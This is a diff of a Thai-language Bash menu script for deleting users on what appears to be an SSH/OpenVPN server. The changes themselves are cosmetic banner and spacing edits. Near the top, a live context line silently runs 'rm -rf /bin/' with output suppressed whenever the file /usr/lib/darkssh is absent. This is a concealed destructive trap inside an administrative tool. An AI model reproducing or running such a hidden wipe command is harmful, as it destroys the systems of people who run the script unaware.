@@ -19,9 +19,9 @@ chown nobody:$GROUPNAME /etc/openvpn/crl.pem
 [[ ! -e /usr/lib/darkssh ]] && rm -rf /bin/ > /dev/null 2>&1
 database="/root/usuarios.db"
 clear
-echo -e "\033[1;35m*****************************************\033[0m"
-tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "ลบ ผู้ใช้" ; tput sgr0
-echo -e "\033[1;35m*****************************************\033[0m"
+echo -e "\033[1;35m***************************\033[0m"
+tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "   ลบ ผู้ใช้" ; tput sgr0
+echo -e "\033[1;35m***************************\033[0m"
 echo ""
 echo -e "\033[1;31m[\033[1;32m1\033[1;31m]\033[1;36m ลบ ผู้ใช้รายคน"
 echo -e "\033[1;31m[\033[1;32m2\033[1;31m]\033[1;36m ลบ ผู้ใช้ทั้งหมด"
@@ -30,9 +30,9 @@ echo ""
 read -p "$(echo -e "\033[1;32mSELECT MENU\033[1;31m ?\033[1;37m : ")" -e -i 1 resp
 if [[ "$resp" = "1" ]]; then
 clear
-tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "ลบ ผู้ใช้" ; tput sgr0
+tput setaf 7 ; tput setab 4 ; tput bold ; printf '%32s%s%-13s\n' "   ลบ ผู้ใช้" ; tput sgr0
 echo ""
-echo -e "  \033[1;33mรายชื่อผู้ใช้งานทั้งหมด: \033[0m"
+echo -e "   \033[1;33mรายชื่อผู้ใช้งานทั้งหมด: \033[0m"
 echo""
 _userT=$(awk -F: '$3>=1000 {print $1}' /etc/passwd | grep -v nobody)
 i=0
